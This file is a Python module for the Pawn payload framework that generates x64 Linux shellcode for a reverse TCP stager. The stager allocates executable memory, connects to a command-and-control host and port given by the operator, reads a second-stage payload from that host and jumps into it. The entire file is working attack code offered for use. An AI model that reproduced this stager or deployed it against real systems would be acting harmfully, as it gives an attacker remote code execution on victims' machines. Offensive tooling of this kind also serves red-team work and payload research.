"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from typing import Optional
from textwrap import dedent

from pex.assembler import Assembler
from pex.socket import Socket

from pawn.lib.module import Module


class PawnModule(Module, Socket, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "linux/x64/reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Architecture': "x64",
            'Platform': "linux",
            'SendSize': False,
        })

    def run(self, host: str, port: int, length: int = 4096, reliable: bool = True) -> bytes:
        host = self.pack_host(host)
        port = self.pack_port(port)

        payload = dedent(f"""\
            start:
                /*
                 * Allocate space in memory for our phase
                 * mmap(NULL, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
                 */

                push 0x9
                pop rax
                xor rdi, rdi
                push {hex(length)}
                pop rsi
                push 0x7
                pop rdx
                xor r9, r9
                push 0x22
                pop r10
                syscall

        """)

        if reliable:
            payload += dedent("""\
                    test rax, rax
                    js fail
            """)

        payload += dedent(f"""\
                push rax

                /*
                 * Set up socket for further communication with C2
                 * socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
                 */

                push 0x29
                pop rax
                cdq
                push 0x2
                pop rdi
                push 0x1
                pop rsi
                syscall

                /*
                 * Connect to the C2 server
                 * connect(rdi, {{sa_family=AF_INET, sin_port=htons(port), sin_addr=inet_addr(host)}}, 16)
                 */

                xchg rdi, rax
                movabs rcx, 0x{host.hex()}{port.hex()}0002
                push rcx
                mov rsi, rsp
                push 0x10
                pop rdx
                push 0x2a
                pop rax
                syscall

                pop rcx

                /*
                 * Read phase to allocated memory space
                 * recvfrom(rdi, rsi, length, MSG_WAITALL, NULL, 0)
                 */

                push 0x2d
                pop rax
                pop rsi
                push {hex(length)}
                pop rdx
                push 0x100
                pop r10
                syscall
        """)

        if reliable:
            payload += dedent("""\
                    test rax, rax
                    js fail
            """)

        payload += dedent("""\
                /* Jump to the next phase */
                jmp rsi
        """)

        if reliable:
            payload += dedent("""\
                fail:
                    /*
                    * Exit phase in case of failure
                    * exit(0)
                    */

                    push 0x3c
                    pop rax
                    xor rdi, rdi
                    syscall
            """)

        return self.assemble(
            self.details['Architecture'], payload)
